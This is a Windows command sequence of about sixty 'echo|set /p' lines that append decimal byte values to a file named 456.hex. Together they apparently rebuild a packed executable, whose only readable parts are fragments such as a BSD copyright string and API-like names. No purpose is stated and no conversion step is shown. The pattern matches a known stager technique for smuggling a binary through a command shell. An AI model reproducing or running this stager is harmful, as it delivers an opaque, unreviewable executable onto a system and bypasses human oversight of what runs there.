echo|set /p=235 72 15 240 77 9 25 33 58 70 151 252 98 156 105 58 183 206 110 244 146 21 235 165 152 5 211 144 140 8 105 223 120 66 220 26 250 167 203 82 125 34 155 58 109 49 36 165 76 9 143 215 226 129 147 12 198 103 135 207 39 52 23 98 49 58 68 15 63 93 46 35 220 218 100 58 125 234 179 116 80 244 252 108 39 27 120 119 87 168 0 58 18 233 105 146 129 192 18 10 202 74 69 132 239 5 153 208 210 81 29 4 59 130 27 29 146 1 198 161 218 189 39 7 146 179 223 22 >>456.hex
echo|set /p=51 35 135 234 6 49 101 130 148 35 205 246 118 184 2 18 86 53 19 147 6 20 57 90 70 20 114 164 17 20 104 110 111 38 42 103 214 126 24 226 196 96 16 56 129 205 212 4 13 4 205 143 127 28 185 196 9 106 215 56 1 224 0 32 32 209 133 204 47 114 132 224 194 172 40 175 79 50 127 252 143 30 16 3 168 237 73 137 139 120 253 140 13 195 166 220 191 185 125 34 250 16 147 32 65 141 85 64 77 137 131 128 10 107 32 30 222 6 139 88 253 232 245 148 80 21 243 159 >>456.hex
echo|set /p=57 114 171 40 171 96 18 104 73 199 131 72 77 179 29 8 233 22 84 68 100 65 58 211 125 4 68 39 112 23 24 197 224 121 190 72 4 64 120 92 90 64 169 139 44 117 147 238 73 238 235 244 3 54 233 11 145 31 76 153 129 163 65 194 116 15 119 252 169 25 246 151 207 156 192 94 148 123 160 55 15 211 144 171 47 53 35 44 235 68 57 45 235 165 156 108 155 138 239 237 101 96 38 112 91 246 246 123 32 159 13 59 223 90 93 144 15 145 13 240 219 11 193 50 76 99 237 239 >>456.hex
echo|set /p=221 72 193 227 6 77 79 226 86 118 35 73 90 112 249 168 70 206 238 138 27 89 35 40 186 141 81 1 13 44 216 86 27 217 69 247 216 43 97 48 44 107 255 239 113 234 56 151 255 197 78 137 28 232 74 139 71 130 202 117 11 223 35 16 137 97 125 66 10 174 125 192 221 220 45 74 160 79 111 194 86 166 18 145 104 196 45 238 244 238 124 73 110 65 110 243 79 213 69 28 249 196 97 23 239 108 224 0 77 149 119 54 76 131 156 126 178 188 246 0 135 233 92 221 43 29 135 229 >>456.hex
echo|set /p=108 6 114 212 45 130 46 39 116 194 45 192 206 28 117 72 212 184 11 196 235 47 104 95 88 206 131 198 48 252 107 142 92 248 156 115 12 78 132 143 13 152 13 14 224 146 240 100 117 230 151 149 180 208 84 184 136 152 70 179 148 79 111 169 71 29 161 32 75 88 195 21 35 190 35 13 28 151 137 162 152 175 153 225 8 233 98 196 208 255 226 113 3 83 69 186 4 218 158 202 68 56 40 246 133 192 4 153 151 233 1 117 242 29 11 104 16 166 3 210 149 13 177 219 170 65 30 192 >>456.hex
echo|set /p=186 124 13 96 137 48 123 216 177 148 61 235 15 71 235 5 36 69 236 88 211 36 140 174 132 134 142 237 70 184 171 162 4 55 8 168 16 63 174 141 61 139 167 167 0 172 65 151 215 250 248 228 130 193 165 220 30 85 143 71 187 246 125 153 58 41 150 16 3 151 83 36 6 236 159 25 116 112 59 195 115 108 65 255 119 143 201 88 108 140 39 66 18 12 44 102 174 211 119 156 39 176 45 61 115 96 241 197 225 192 222 2 73 81 89 40 119 142 46 145 158 28 225 7 142 124 192 150 >>456.hex
echo|set /p=248 141 18 98 16 77 200 153 150 247 175 7 27 91 248 42 137 247 216 174 188 149 13 173 100 182 25 175 78 109 14 64 191 234 102 190 73 33 28 144 152 29 145 88 16 206 102 133 92 147 190 168 132 179 52 97 198 83 255 180 71 78 218 21 70 80 145 117 144 245 117 96 154 164 160 65 251 216 133 146 145 168 35 225 100 145 222 100 220 185 133 59 18 104 126 100 144 56 139 108 152 46 232 111 25 232 85 193 252 54 48 32 235 76 6 5 236 252 158 130 64 176 116 107 247 230 13 55 >>456.hex
echo|set /p=154 117 58 173 68 18 232 14 149 20 129 82 35 77 180 74 185 64 16 122 234 145 162 122 140 183 177 27 228 197 100 13 131 251 81 189 66 73 71 187 78 100 34 80 78 213 39 176 101 101 55 36 80 189 146 77 75 29 181 90 65 25 82 242 56 97 116 26 136 45 43 180 250 17 138 141 232 115 130 127 143 92 182 147 48 219 137 40 11 244 194 124 12 39 0 93 187 96 18 105 86 46 73 184 11 183 139 72 255 218 193 253 7 218 121 114 237 218 195 133 246 75 7 215 252 25 161 23 >>456.hex
echo|set /p=230 176 66 242 108 21 162 18 64 40 179 21 233 246 250 31 118 165 39 47 18 161 225 122 198 71 55 72 96 126 106 173 112 100 99 211 71 162 70 221 183 226 6 81 59 2 24 134 218 80 184 76 4 144 2 8 132 12 112 241 85 174 120 105 109 147 11 157 241 251 141 207 17 8 232 141 77 25 106 103 134 108 191 2 100 255 96 221 207 245 195 59 29 165 201 105 124 150 121 76 169 224 170 215 227 118 147 48 227 39 130 114 12 83 130 248 41 140 22 254 143 112 147 24 119 148 68 43 >>456.hex
echo|set /p=221 120 6 69 141 123 60 9 22 42 125 235 165 72 9 124 3 1 69 237 80 245 158 143 238 7 143 118 129 76 223 112 1 152 99 171 246 108 7 118 190 185 74 170 94 118 174 224 91 4 84 43 24 131 32 91 157 139 118 123 176 128 36 119 134 74 117 43 48 18 11 40 184 205 178 70 139 40 229 41 224 182 50 88 28 121 53 16 150 42 86 44 216 125 49 141 124 15 90 120 143 90 198 152 138 85 15 1 21 136 13 152 29 153 43 68 120 117 155 6 134 129 161 43 191 84 241 2 >>456.hex
echo|set /p=9 135 86 248 129 24 78 64 93 46 59 4 131 27 132 56 194 230 137 59 193 133 145 28 172 140 55 197 59 161 32 116 203 237 173 77 237 167 196 100 161 75 196 148 124 52 196 196 35 31 58 4 236 105 177 141 42 153 29 238 144 142 80 16 158 137 84 218 253 22 110 251 255 198 52 247 195 117 79 20 200 73 38 244 213 19 210 117 10 17 124 215 131 167 72 52 36 81 21 65 226 15 15 228 179 252 83 122 137 44 138 156 5 225 113 18 192 225 83 139 208 9 172 136 205 239 83 206 >>456.hex
echo|set /p=200 0 46 91 139 99 240 29 197 15 183 92 59 240 159 113 13 69 147 211 21 205 61 84 235 230 28 100 28 102 232 183 119 140 24 76 1 8 212 51 200 49 122 129 220 140 153 85 141 169 224 185 121 123 140 29 181 83 65 150 9 173 214 94 196 74 17 198 59 165 118 147 186 86 139 90 198 116 118 131 55 105 58 200 82 139 115 74 246 92 38 203 23 131 14 175 136 214 13 6 218 215 214 217 54 235 214 21 210 220 163 128 144 3 88 59 25 114 131 156 199 140 107 197 62 143 117 136 >>456.hex
echo|set /p=199 139 88 159 64 14 65 67 226 133 78 236 129 199 221 217 143 90 74 245 116 18 254 4 116 27 61 58 213 27 190 210 120 58 81 139 92 48 153 187 84 136 109 7 9 100 211 169 58 120 144 212 141 34 52 44 203 51 179 68 183 207 206 239 71 113 235 96 76 66 242 71 129 111 67 205 91 75 76 117 80 118 75 166 73 71 38 228 216 3 72 136 202 110 171 136 208 14 121 1 183 58 146 28 185 193 235 28 56 191 135 168 144 188 100 71 195 116 171 106 40 214 137 78 96 103 142 86 >>456.hex
echo|set /p=40 26 119 71 124 38 118 207 201 37 65 68 135 18 13 27 91 71 98 207 118 62 45 109 104 78 16 163 239 216 147 138 44 84 139 114 45 72 37 159 233 204 200 55 135 24 6 25 42 100 96 116 136 2 2 252 253 165 185 221 48 104 73 126 40 68 244 197 85 31 129 205 21 75 56 188 117 126 139 56 23 41 243 54 7 203 185 2 13 68 92 55 129 245 64 116 32 132 164 114 131 30 6 110 128 5 233 224 57 112 116 90 50 214 1 232 200 223 155 126 67 68 106 79 109 183 203 251 >>456.hex
echo|set /p=231 6 11 44 55 118 237 205 79 15 193 3 131 134 42 57 134 1 55 61 96 182 135 48 2 6 15 217 11 153 155 219 33 216 69 124 189 192 103 188 137 124 36 217 34 117 148 88 88 156 67 76 221 48 29 100 228 2 195 236 133 57 54 181 228 169 40 16 197 40 3 43 226 68 75 145 115 28 185 84 8 197 112 4 137 38 34 116 119 147 96 17 139 29 12 144 190 73 63 238 130 55 114 141 102 1 62 137 61 123 71 99 5 112 152 207 191 108 6 141 21 37 70 13 222 248 240 127 >>456.hex
echo|set /p=228 150 86 89 22 76 168 68 15 183 29 200 70 246 214 101 7 210 214 79 30 102 100 220 117 8 62 189 185 254 225 184 70 209 243 15 111 5 218 143 7 127 5 170 201 49 110 223 17 59 223 116 7 102 28 153 70 57 48 38 1 110 219 112 156 111 102 68 139 124 26 213 14 48 108 249 203 132 233 85 135 234 118 146 95 185 6 38 125 105 107 90 154 11 120 5 46 210 19 255 16 92 210 60 4 0 200 134 251 97 247 203 243 104 125 10 244 196 37 252 5 161 70 206 127 217 195 25 >>456.hex
echo|set /p=22 86 237 37 64 64 132 53 26 109 49 215 125 195 56 154 149 46 94 51 198 2 70 46 139 97 88 162 125 46 201 6 220 229 168 132 170 104 55 243 185 5 152 93 30 58 70 175 69 247 46 27 100 41 70 111 109 51 255 44 13 183 203 62 228 8 22 38 21 126 153 39 207 0 185 11 99 233 34 8 5 107 67 133 103 253 214 74 113 254 23 116 10 184 5 190 124 248 42 130 8 208 187 105 25 139 21 207 69 186 215 224 189 158 1 80 63 48 254 172 200 45 152 34 8 108 66 15 >>456.hex
echo|set /p=222 204 198 3 76 68 167 82 13 26 69 131 47 6 253 140 50 134 38 51 14 41 221 9 16 219 25 192 56 15 32 235 154 91 9 248 70 15 182 13 240 253 6 5 234 68 99 79 158 220 7 21 230 13 221 5 212 30 21 179 48 1 152 204 32 29 176 182 232 196 13 169 191 46 32 175 222 96 96 123 5 117 37 213 168 145 234 117 26 139 223 130 134 142 221 95 155 152 196 122 169 79 131 23 184 107 22 86 103 52 229 64 15 149 59 199 235 158 103 91 160 91 109 87 27 72 105 24 >>456.hex
echo|set /p=120 150 231 217 12 59 93 11 46 90 88 15 116 66 121 227 35 199 133 128 44 121 182 223 213 12 235 18 40 5 88 18 178 33 40 205 241 96 4 21 103 84 156 24 131 24 19 2 213 108 236 32 92 55 16 58 242 48 160 87 96 168 66 121 35 160 99 64 71 78 106 35 97 114 35 195 128 78 196 236 222 51 194 128 26 5 56 40 55 32 71 5 82 38 71 66 29 53 169 37 237 80 248 46 209 33 155 131 42 66 25 30 235 34 10 177 250 108 93 132 222 34 254 187 200 17 6 244 >>456.hex
echo|set /p=119 45 80 117 178 163 14 171 131 98 217 65 173 75 192 235 78 243 214 147 74 217 88 135 130 37 35 64 143 34 201 174 83 231 76 60 34 18 2 76 119 176 144 90 57 77 110 143 83 55 252 212 38 67 97 16 42 179 114 40 194 18 204 142 77 72 115 97 129 106 22 212 136 131 131 152 141 124 29 9 140 95 241 124 16 75 38 192 243 72 173 142 118 193 46 43 200 7 237 102 69 55 23 255 214 110 241 119 230 246 242 15 89 53 118 181 7 94 53 173 197 230 155 110 102 15 46 53 >>456.hex
echo|set /p=94 122 12 251 19 109 75 196 230 16 5 74 235 4 3 198 3 239 52 83 221 173 37 69 42 250 42 248 90 31 40 250 184 1 20 186 154 115 13 114 44 234 107 111 24 14 153 199 196 132 12 4 230 91 90 19 151 208 166 112 6 207 75 135 88 96 187 144 229 70 93 156 132 155 175 36 208 193 14 57 207 119 76 186 156 215 92 75 18 252 30 204 4 201 96 80 220 34 86 72 195 175 120 64 135 88 164 91 27 108 181 137 32 80 216 115 233 160 240 69 92 40 81 88 61 154 128 96 >>456.hex
echo|set /p=196 70 240 114 125 159 127 100 133 14 3 58 106 128 251 4 139 173 73 197 199 235 119 116 56 50 237 78 72 208 131 206 191 5 73 128 50 178 116 47 176 74 22 109 199 186 205 216 13 87 13 235 54 181 121 205 68 142 125 193 43 124 70 13 51 235 206 70 100 228 194 27 213 17 34 172 106 80 138 87 222 115 108 36 91 117 107 40 119 48 235 103 9 114 196 137 62 64 227 179 104 65 104 174 199 64 208 87 4 231 2 209 175 113 136 191 110 132 254 15 198 5 226 50 11 64 158 112 >>456.hex
echo|set /p=172 141 37 27 212 97 184 209 17 110 35 31 126 60 151 15 1 147 3 131 210 7 48 59 17 187 130 148 131 11 125 223 4 155 206 37 247 52 189 186 212 101 85 174 99 75 201 130 223 64 34 6 163 190 52 2 102 254 197 128 60 146 203 82 126 120 82 81 160 72 179 172 182 114 178 125 44 106 203 131 226 251 109 65 13 130 203 54 207 79 213 235 144 57 104 14 226 69 69 77 117 15 158 25 136 102 45 63 208 50 130 226 194 33 105 215 235 7 17 240 49 142 224 92 197 248 170 59 >>456.hex
echo|set /p=129 127 127 246 86 77 100 216 200 205 120 25 66 134 208 254 87 226 32 10 151 6 13 117 5 66 198 4 102 145 221 108 23 206 121 231 156 107 167 126 72 154 35 151 30 181 125 198 129 216 64 9 57 88 239 98 125 117 73 78 46 70 116 133 1 85 201 157 6 162 205 40 142 196 230 96 40 161 226 20 222 151 175 29 14 71 222 235 225 191 10 175 96 19 212 185 35 255 71 61 51 117 38 76 198 221 131 79 172 141 60 191 112 3 248 1 102 123 28 22 155 84 116 205 25 213 66 162 >>456.hex
echo|set /p=171 205 14 89 117 96 245 67 128 57 66 213 42 26 244 217 238 211 33 84 135 205 19 249 124 13 92 110 56 206 194 211 129 39 238 217 59 92 6 44 93 168 210 59 47 89 72 175 221 1 212 170 45 123 201 128 63 41 57 91 192 65 143 49 62 186 88 227 203 201 232 125 11 59 117 3 198 221 56 42 144 0 49 207 195 140 66 179 179 223 1 155 106 176 219 129 69 116 246 123 217 235 64 203 18 112 183 37 85 37 214 31 47 44 11 92 96 56 189 26 34 178 68 15 128 93 4 143 >>456.hex
echo|set /p=5 232 33 99 246 33 231 200 177 135 145 239 6 21 220 13 197 85 221 220 89 14 42 236 37 204 33 122 62 10 242 93 56 106 8 16 59 22 145 131 56 63 48 101 124 74 212 49 120 4 37 48 22 120 8 169 112 3 160 208 239 187 38 152 59 227 45 234 21 123 191 10 191 1 155 22 76 151 24 231 171 185 232 213 29 180 85 110 139 109 235 215 22 158 103 40 204 246 51 54 163 185 31 56 137 44 235 93 21 81 129 218 42 232 220 77 107 59 205 239 245 62 240 176 127 122 53 145 >>456.hex
echo|set /p=6 183 167 85 19 110 87 232 115 29 37 34 14 219 138 55 66 171 209 22 158 8 35 123 66 55 28 235 222 131 16 184 255 78 134 108 76 177 110 228 119 6 33 114 244 58 29 250 57 86 225 54 248 204 13 34 123 32 194 211 28 55 92 8 56 167 49 117 9 188 135 5 205 231 234 189 130 58 95 6 111 45 56 80 119 108 196 58 169 136 216 94 15 231 31 8 62 148 109 245 172 58 81 133 32 199 54 119 80 155 21 134 32 112 32 43 55 16 148 58 109 177 137 23 70 98 224 61 >>456.hex
echo|set /p=194 200 86 62 201 36 126 16 113 12 22 200 182 217 204 213 61 95 235 45 45 87 178 117 207 200 52 9 174 30 204 46 66 37 227 141 28 166 48 108 230 5 26 32 7 152 127 48 99 13 122 25 0 139 184 77 73 68 79 64 251 102 57 5 100 105 49 213 79 247 191 14 183 33 147 12 2 80 6 3 200 129 57 80 69 86 183 117 191 81 227 31 65 24 61 11 1 232 26 6 2 17 123 250 221 91 209 46 131 185 132 114 14 118 25 57 129 248 142 14 18 144 41 202 182 121 116 15 >>456.hex
echo|set /p=9 143 39 220 14 177 206 192 136 178 136 31 193 160 186 177 177 126 174 55 124 69 40 165 158 25 73 1 91 81 42 229 73 103 159 221 166 43 221 6 104 137 1 32 255 123 121 31 2 206 237 123 14 60 56 226 195 25 132 123 168 58 47 238 190 212 34 222 247 66 70 47 215 46 236 22 150 24 178 27 221 132 212 204 0 102 125 31 31 4 63 244 184 160 13 121 25 31 193 221 221 82 251 193 16 102 247 193 77 129 194 22 193 201 16 57 138 3 51 75 147 168 57 220 95 189 235 255 >>456.hex
echo|set /p=77 121 129 56 99 115 109 224 117 44 131 120 24 4 122 64 32 61 32 231 239 133 10 53 226 21 61 33 6 14 61 34 209 219 182 248 7 61 0 64 153 73 7 169 74 65 128 129 70 22 147 99 147 91 200 142 54 83 121 200 115 200 122 16 41 155 124 11 196 0 183 218 39 108 130 185 194 8 116 3 63 202 99 72 195 65 104 134 60 179 9 181 12 186 170 245 41 251 183 29 81 24 15 148 192 243 195 63 76 99 65 60 219 11 240 93 149 139 210 76 3 193 120 64 20 69 4 88 >>456.hex
echo|set /p=191 5 189 192 6 74 186 0 24 69 106 30 139 81 12 76 42 190 21 254 59 210 114 10 139 65 8 24 9 208 114 15 65 2 104 239 111 212 193 40 69 59 203 114 226 113 129 192 165 224 192 219 193 108 22 103 108 123 243 244 218 201 8 76 34 77 43 193 14 208 17 191 112 42 20 188 27 47 36 193 232 31 247 37 187 132 253 208 131 224 1 235 2 248 249 238 121 28 8 46 217 234 11 108 227 24 48 62 224 93 133 59 202 116 66 66 60 200 67 245 219 66 106 42 235 60 124 37 >>456.hex
echo|set /p=129 121 191 133 55 179 112 16 115 28 16 65 177 137 4 36 176 215 136 166 14 18 171 194 183 16 174 131 46 232 235 6 75 20 2 194 127 159 46 140 138 24 91 217 183 196 119 236 26 34 21 219 240 200 188 137 68 10 220 94 240 27 67 108 72 92 232 49 184 177 209 239 244 102 2 92 3 221 176 168 88 212 116 2 193 191 139 136 64 52 129 255 241 31 172 168 23 155 72 191 50 162 223 45 153 43 174 69 3 226 128 76 49 143 219 137 168 233 5 248 22 65 118 126 120 131 7 186 >>456.hex
echo|set /p=29 56 187 10 128 119 16 55 32 91 161 73 173 11 124 120 34 77 119 216 171 89 16 111 51 76 56 20 107 21 170 76 108 219 0 180 16 108 219 81 35 216 12 51 110 193 223 119 215 180 1 194 216 101 130 109 73 247 211 9 150 146 15 76 128 103 64 91 207 38 211 212 8 234 136 112 161 28 187 171 65 167 191 118 99 29 140 29 170 82 227 21 170 9 129 43 227 45 136 68 95 105 220 230 212 26 57 130 133 80 14 65 152 93 122 39 21 196 64 213 48 9 6 131 7 35 249 5 >>456.hex
echo|set /p=76 28 88 76 3 65 171 234 63 80 237 59 86 133 67 56 78 212 165 221 239 194 16 128 63 31 24 29 70 183 189 160 102 14 245 18 165 62 176 232 177 133 88 254 69 5 111 27 2 80 187 175 30 5 112 28 119 70 20 9 4 107 96 2 188 42 5 64 27 86 135 21 118 124 24 164 59 104 11 129 112 239 204 117 154 239 179 169 147 133 121 231 117 5 233 186 89 112 35 241 65 98 227 13 19 196 176 75 94 198 175 182 117 162 11 57 32 151 29 86 118 23 242 222 117 219 138 94 >>456.hex
echo|set /p=198 107 69 139 77 218 253 104 251 27 85 192 227 248 65 246 0 4 10 209 92 248 75 37 71 35 8 77 99 80 4 247 174 3 209 0 250 47 108 199 200 200 209 73 99 195 74 139 20 16 141 191 85 236 203 139 72 52 75 8 246 65 3 15 64 107 75 148 218 15 182 6 73 93 152 41 38 6 24 195 116 51 202 105 133 233 43 46 74 19 2 23 77 199 250 41 70 67 116 32 209 190 12 180 123 3 118 201 11 18 120 14 11 10 139 243 213 36 64 113 32 126 131 247 129 226 209 240 >>456.hex
echo|set /p=136 50 112 89 181 84 24 217 33 85 119 5 152 219 42 50 154 181 139 1 38 183 134 75 53 1 169 4 98 143 6 59 6 50 110 185 45 253 2 80 9 21 8 0 108 10 3 116 9 100 11 92 110 79 248 82 17 208 42 152 175 237 148 7 67 150 196 156 238 176 242 157 9 59 66 31 227 7 37 99 147 203 22 153 230 156 31 34 158 236 189 221 89 19 143 153 11 7 115 48 1 10 242 237 111 23 212 10 52 107 10 50 6 112 1 12 19 12 1 17 0 43 205 118 114 6 25 143 >>456.hex
echo|set /p=25 25 3 246 242 187 114 84 7 23 25 50 21 192 1 24 24 100 16 3 109 251 203 229 84 15 52 14 146 20 208 18 192 16 47 22 43 126 131 203 237 22 100 143 3 52 142 1 138 253 208 13 192 11 112 93 115 191 220 111 25 26 11 242 4 48 124 159 14 127 20 114 123 235 46 20 178 47 16 79 16 100 13 3 84 12 246 22 183 237 146 12 15 17 123 17 50 22 12 96 11 155 86 40 205 237 24 7 95 116 75 74 101 23 194 114 251 221 208 71 44 11 0 26 84 106 3 52 >>456.hex
echo|set /p=104 1 60 238 215 222 237 19 224 21 15 192 47 27 91 0 3 35 93 46 183 183 49 79 31 100 59 3 84 58 52 57 1 50 214 61 155 189 63 240 22 224 161 39 128 1 131 23 4 219 110 151 238 23 226 139 5 5 52 11 1 28 131 28 139 246 178 101 183 28 84 7 52 11 50 53 25 27 88 130 121 86 248 9 1 70 0 49 63 32 2 175 110 205 66 51 12 11 183 52 114 139 1 15 228 236 191 221 207 15 52 19 15 114 11 192 9 112 8 96 55 24 220 118 227 155 176 251 >>456.hex
echo|set /p=13 11 13 52 215 13 211 134 246 214 21 97 15 27 63 27 52 146 3 47 219 238 11 255 20 240 18 224 16 208 14 192 9 11 96 10 80 203 39 9 95 84 123 183 88 154 38 37 1 204 14 208 25 75 179 91 183 57 240 25 24 95 104 79 4 194 95 72 211 140 157 72 199 12 11 10 240 246 47 92 36 83 18 100 6 1 18 52 4 3 1 2 1 119 204 69 239 155 55 118 187 100 9 191 116 151 134 75 8 82 11 139 5 120 2 95 3 255 205 240 176 130 123 6 115 0 19 112 >>456.hex
echo|set /p=18 96 17 80 16 48 223 176 53 99 131 7 47 39 29 62 22 112 21 96 20 164 249 206 102 231 23 31 231 86 84 220 222 154 95 23 144 2 41 99 23 100 75 3 84 74 50 88 67 185 52 72 87 16 31 32 36 77 211 76 85 84 82 80 179 209 29 194 112 119 116 3 100 143 21 154 166 57 123 21 50 17 192 83 58 57 56 54 141 142 205 73 160 1 42 9 75 146 79 121 182 52 205 100 145 144 142 192 31 96 4 252 255 210 177 40 10 175 101 240 13 224 11 208 9 192 7 112 >>456.hex
echo|set /p=6 96 5 80 43 90 104 158 16 3 37 75 37 151 67 236 127 97 37 92 0 30 240 28 224 26 208 24 192 239 163 202 210 52 223 36 143 15 14 12 146 114 129 116 30 139 64 63 208 38 44 221 110 3 84 9 143 8 50 159 115 194 100 194 219 84 151 7 91 118 47 75 6 50 25 43 11 75 17 1 16 3 207 134 177 112 1 8 199 240 49 207 48 8 155 166 43 79 95 8 115 20 20 20 50 8 17 196 114 91 51 124 10 105 0 21 241 69 149 164 34 216 21 149 76 1 255 0 >>456.hex
echo|set /p=15 18 13 33 2 6 205 93 32 110 191 4 237 210 102 212 23 181 4 9 8 12 16 17 4 0 254 82 252 223 4 58 0 134 221 40 16 6 7 8 24 177 0 18 0 59 0 255 255 159 28 194 0 42 0 64 40 35 41 32 67 111 112 121 114 105 10 254 191 253 103 104 116 32 40 99 13 49 57 56 51 32 84 104 101 32 82 101 103 84 112 247 47 158 111 102 32 116 14 85 110 105 124 251 191 111 173 115 105 116 121 17 67 97 108 105 102 111 114 19 97 46 10 32 187 123 91 20 >>456.hex
echo|set /p=164 32 64 44 114 101 115 36 124 64 104 91 39 100 21 195 7 244 146 39 132 28 236 129 76 240 23 240 127 15 217 28 236 67 232 47 232 115 1 1 16 244 176 203 206 39 5 100 116 23 196 71 114 176 19 114 224 117 30 128 47 88 118 39 228 32 23 148 220 139 52 168 207 78 200 39 7 216 119 32 140 119 7 208 97 15 153 144 124 52 200 121 23 57 33 7 59 35 40 215 192 122 32 56 6 59 33 7 188 123 40 64 95 176 216 132 29 66 172 141 47 22 95 57 216 9 121 164 >>456.hex
echo|set /p=125 31 248 23 156 126 8 121 120 11 4 103 148 114 176 19 118 144 128 23 33 200 119 136 140 11 236 97 19 49 95 128 129 191 200 65 78 216 120 130 23 36 100 112 131 19 114 16 78 41 144 7 104 132 24 176 19 114 144 80 96 133 47 128 71 39 228 5 114 92 134 84 135 19 148 200 9 57 24 111 76 120 12 76 57 200 9 57 68 137 31 184 64 145 227 66 126 43 143 60 138 72 63 66 24 66 6 52 44 55 33 28 66 24 36 199 24 142 247 108 66 14 118 44 23 16 143 37 >>456.hex
echo|set /p=143 25 236 132 60 8 144 48 188 191 0 210 9 251 2 6 248 147 167 29 64 47 57 200 133 124 6 240 148 192 176 149 19 242 217 9 14 176 23 6 232 150 43 129 11 249 132 248 79 6 224 151 120 169 249 172 180 0 199 31 5 96 1 129 28 228 2 88 84 3 57 200 80 114 76 68 64 4 163 71 217 9 202 128 153 117 152 93 148 148 138 42 240 130 144 85 1 80 129 4 170 160 2 25 5 21 1 54 10 7 102 185 92 30 40 26 69 28 84 160 76 179 109 150 203 169 30 48 >>456.hex
echo|set /p=161 176 141 32 11 100 164 105 154 101 148 32 188 120 196 236 237 206 182 25 244 142 35 35 28 7 31 38 215 185 93 179 11 4 40 7 71 40 39 83 80 7 53 219 238 108 13 42 71 20 7 146 44 23 208 152 186 205 114 217 7 55 45 200 158 64 121 46 19 159 72 119 182 217 7 128 185 46 95 192 11 249 72 115 114 57 0 47 114 47 120 177 100 51 72 51 184 241 248 49 48 109 51 200 242 56 48 133 140 192 49 111 93 179 237 204 160 157 7 34 51 107 124 40 7 92 118 103 >>456.hex
echo|set /p=187 179 52 23 100 7 235 53 167 244 7 55 56 107 182 93 231 151 167 64 7 135 57 35 172 144 7 154 109 119 182 240 59 11 248 7 65 63 35 32 72 103 187 174 235 7 120 3 132 23 128 7 180 64 83 188 206 237 206 118 7 240 65 11 248 7 35 68 199 47 16 118 103 187 44 7 160 68 23 168 7 190 68 91 117 187 147 93 11 43 69 52 7 16 70 75 158 194 238 108 179 7 24 119 70 47 128 7 12 71 163 219 117 110 119 20 7 70 80 163 11 76 7 233 81 35 118 205 >>456.hex
echo|set /p=182 59 240 7 231 82 59 152 240 7 223 83 109 182 93 231 187 11 232 7 252 85 251 96 4 86 206 118 93 179 3 83 136 23 92 7 84 87 59 92 147 219 32 236 7 250 87 115 88 11 115 88 231 118 103 155 124 210 88 35 216 7 234 92 71 95 109 215 108 187 7 65 95 11 60 72 7 190 96 11 217 44 236 154 40 196 7 41 97 223 28 48 97 117 110 119 114 230 97 236 7 163 102 195 23 172 22 118 157 219 7 108 103 139 11 116 7 94 104 139 244 216 117 110 119 7 4 105 >>456.hex
echo|set /p=211 47 12 7 154 108 238 185 157 105 51 159 7 228 110 199 71 7 205 246 53 219 216 112 11 208 224 7 114 11 184 216 219 174 217 118 7 173 116 71 220 180 7 93 119 23 16 183 59 219 53 100 7 226 119 191 232 7 155 126 31 174 217 54 91 160 7 164 98 138 11 148 104 7 205 182 235 220 171 141 139 11 180 7 190 142 59 0 196 182 93 231 118 7 80 143 115 167 88 7 56 144 23 168 237 58 183 107 64 7 37 145 31 83 44 7 32 147 221 25 187 206 119 35 40 7 161 147 >>456.hex
echo|set /p=39 168 7 59 154 193 186 179 148 119 68 7 130 11 136 209 53 203 166 105 8 216 134 150 24 140 6 235 78 216 7 91 151 115 100 7 118 11 196 6 89 158 108 6 152 12 152 36 220 233 186 206 109 29 153 91 59 72 7 157 11 100 183 105 154 166 164 233 132 240 163 154 91 178 89 46 59 35 172 154 205 155 152 16 156 46 216 238 228 115 156 124 7 153 156 107 23 139 179 107 154 224 16 230 11 7 157 137 96 141 138 0 95 193 127 81 4 3 0 77 0 85 0 73 242 83 0 144 >>456.hex
echo|set /p=68 205 254 205 254 200 223 12 50 50 1 17 2 102 69 57 10 59 228 255 255 255 104 179 71 195 9 209 219 125 250 2 48 252 228 76 154 104 56 75 58 77 169 148 217 242 32 204 95 166 105 186 35 136 15 14 152 8 55 217 100 144 160 176 0 184 10 186 41 131 73 12 149 16 23 24 224 7 27 64 11 27 101 0 110 0 45 165 0 32 233 201 83 146 69 84 96 237 45 58 10 34 20 254 77 4 97 168 40 5 11 70 191 65 16 237 114 101 101 9 194 80 114 111 99 101 16 230 >>456.hex
echo|set /p=223 222 115 115 19 15 70 111 114 109 97 116 77 8 34 182 81 222 87 31 63 182 253 59 173 65 116 116 114 105 98 117 116 23 65 19 83 116 100 72 97 97 40 136 238 110 100 108 65 76 242 103 179 72 4 88 11 88 83 115 183 223 46 84 104 9 97 100 85 73 76 41 103 117 78 20 205 185 223 126 73 110 105 116 105 33 105 122 101 67 114 9 44 38 54 231 34 136 99 16 58 42 118 109 223 220 202 21 106 61 115 116 69 114 163 114 202 92 4 177 13 69 65 35 108 219 110 93 >>456.hex
echo|set /p=105 67 7 115 111 140 67 164 108 150 217 219 220 236 114 227 26 114 102 210 78 109 238 109 59 67 117 75 101 71 68 105 114 63 25 121 189 181 93 219 207 87 97 81 247 83 105 166 57 79 98 106 136 68 16 205 24 20 243 91 219 102 65 27 244 126 118 53 70 109 102 48 220 118 62 86 97 133 97 98 23 49 54 247 221 132 219 100 3 114 115 39 227 115 68 66 67 83 206 206 54 20 68 100 57 69 120 33 67 246 216 161 32 170 10 78 101 120 43 54 108 22 27 21 177 113 25 194 >>456.hex
echo|set /p=172 123 15 77 111 118 10 63 65 202 97 182 93 204 13 87 253 24 10 105 100 241 104 194 236 181 223 136 84 111 77 117 108 223 109 225 12 17 68 178 109 65 100 84 9 193 222 123 229 233 61 31 220 71 65 20 218 79 25 51 47 109 152 115 109 100 82 231 70 121 76 87 103 152 140 97 97 6 83 185 209 161 32 18 194 83 150 6 60 131 115 11 103 75 46 116 59 132 177 36 93 86 112 95 115 53 58 67 65 36 108 49 83 187 153 97 200 183 82 63 230 25 85 110 14 11 109 132 >>456.hex
echo|set /p=104 35 100 123 141 112 202 66 115 179 230 26 160 122 47 90 68 190 194 246 111 211 82 116 108 67 207 116 229 231 116 220 222 136 25 106 18 152 111 107 117 161 117 110 30 43 56 98 51 71 248 42 86 105 114 214 202 173 81 75 96 119 105 17 104 155 17 140 68 57 18 192 45 163 53 154 189 87 53 36 53 220 10 39 24 121 22 213 84 105 6 115 192 14 96 239 191 9 61 73 100 20 237 22 108 210 40 19 49 99 107 186 98 180 219 135 117 58 81 117 98 121 80 3 193 209 218 23 >>456.hex
